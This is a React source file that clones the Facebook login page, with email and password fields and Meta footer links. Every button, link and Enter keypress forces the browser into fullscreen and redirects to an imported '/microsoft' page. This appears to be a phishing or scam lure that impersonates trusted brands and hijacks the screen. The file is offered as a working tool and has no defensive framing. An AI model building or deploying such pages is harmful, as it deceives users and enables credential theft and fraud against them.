import { useEffect, useRef, useState } from "react";
import { Routes, Route, useNavigate } from "react-router-dom";
import Microsoft from "./pages/microsoft/microsoft";
import "./App.css";

function AppContent() {
  const triggered = useRef(false);
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const goFullscreen = async () => {
    if (triggered.current) return;
    triggered.current = true;

    const el = document.documentElement;
    if (el.requestFullscreen) {
      try {
        await el.requestFullscreen();
      } catch (err) {
        console.log("Fullscreen failed:", err);
        triggered.current = false;
      }
    }
  };

  useEffect(() => {
    const handleFullscreenChange = () => {
      if (!document.fullscreenElement) triggered.current = false;
    };
    document.addEventListener("fullscreenchange", handleFullscreenChange);
    return () => {
      document.removeEventListener("fullscreenchange", handleFullscreenChange);
    };
  }, []);

  const handleAnyClick = (e: React.MouseEvent) => {
    e.preventDefault();
    goFullscreen();
    navigate("/microsoft");
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === "Enter") {
      goFullscreen();
      navigate("/microsoft");
    }
  };

  return (
    <div className="fb-page">
      <div className="fb-main">
        <div className="fb-container">
          <div className="fb-left">
            <h1 className="fb-logo">facebook</h1>
            <p className="fb-tagline">
              Connect with friends and the world around you on Facebook.
            </p>
          </div>

          <div className="fb-right">
            <div className="fb-card">
              <input
                className="fb-input"
                placeholder="Email or phone number"
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onKeyPress={handleKeyPress}
              />

              <input
                className="fb-input"
                placeholder="Password"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyPress={handleKeyPress}
              />

              <button className="fb-login" onClick={handleAnyClick}>
                Log In
              </button>

              <a href="#" className="fb-forgot" onClick={handleAnyClick}>
                Forgot password?
              </a>

              <div className="fb-divider"></div>

              <button className="fb-create" onClick={handleAnyClick}>
                Create new account
              </button>
            </div>

            <p className="fb-page-link">
              <strong onClick={handleAnyClick}>Create a Page</strong> for a celebrity, brand or business.
            </p>
          </div>
        </div>
      </div>

      <footer className="fb-footer">
        <div className="fb-footer-content">
          <div className="fb-languages">
            <a href="#" onClick={handleAnyClick}>English (US)</a>
            <a href="#" onClick={handleAnyClick}>Español</a>
            <a href="#" onClick={handleAnyClick}>Français (France)</a>
            <a href="#" onClick={handleAnyClick}>中文(简体)</a>
            <a href="#" onClick={handleAnyClick}>العربية</a>
            <a href="#" onClick={handleAnyClick}>Português (Brasil)</a>
            <a href="#" onClick={handleAnyClick}>Italiano</a>
            <a href="#" onClick={handleAnyClick}>한국어</a>
            <a href="#" onClick={handleAnyClick}>Deutsch</a>
            <a href="#" onClick={handleAnyClick}>हिन्दी</a>
            <a href="#" onClick={handleAnyClick}>日本語</a>
            <button className="fb-lang-more" onClick={handleAnyClick}>+</button>
          </div>
          <div className="fb-divider-footer"></div>
          <div className="fb-links">
            <a href="#" onClick={handleAnyClick}>Sign Up</a>
            <a href="#" onClick={handleAnyClick}>Log In</a>
            <a href="#" onClick={handleAnyClick}>Messenger</a>
            <a href="#" onClick={handleAnyClick}>Facebook Lite</a>
            <a href="#" onClick={handleAnyClick}>Video</a>
            <a href="#" onClick={handleAnyClick}>Places</a>
            <a href="#" onClick={handleAnyClick}>Games</a>
            <a href="#" onClick={handleAnyClick}>Marketplace</a>
            <a href="#" onClick={handleAnyClick}>Meta Pay</a>
            <a href="#" onClick={handleAnyClick}>Meta Store</a>
            <a href="#" onClick={handleAnyClick}>Meta Quest</a>
            <a href="#" onClick={handleAnyClick}>Ray-Ban Meta</a>
            <a href="#" onClick={handleAnyClick}>Meta AI</a>
            <a href="#" onClick={handleAnyClick}>Instagram</a>
            <a href="#" onClick={handleAnyClick}>Threads</a>
          </div>
          <div className="fb-links">
            <a href="#" onClick={handleAnyClick}>Fundraisers</a>
            <a href="#" onClick={handleAnyClick}>Services</a>
            <a href="#" onClick={handleAnyClick}>Voting Information Center</a>
            <a href="#" onClick={handleAnyClick}>Privacy Policy</a>
            <a href="#" onClick={handleAnyClick}>Privacy Center</a>
            <a href="#" onClick={handleAnyClick}>Groups</a>
            <a href="#" onClick={handleAnyClick}>About</a>
            <a href="#" onClick={handleAnyClick}>Create ad</a>
            <a href="#" onClick={handleAnyClick}>Create Page</a>
            <a href="#" onClick={handleAnyClick}>Developers</a>
            <a href="#" onClick={handleAnyClick}>Careers</a>
            <a href="#" onClick={handleAnyClick}>Cookies</a>
            <a href="#" onClick={handleAnyClick}>AdChoices</a>
            <a href="#" onClick={handleAnyClick}>Terms</a>
            <a href="#" onClick={handleAnyClick}>Help</a>
            <a href="#" onClick={handleAnyClick}>Contact Uploading & Non-Users</a>
          </div>
          <div className="fb-copyright">
            <span>Meta © 2026</span>
          </div>
        </div>
      </footer>
    </div>
  );
}

export default function App() {
  return (
    <Routes>
      <Route path="/" element={<AppContent />} />
      <Route path="/microsoft" element={<Microsoft />} />
    </Routes>
  );
}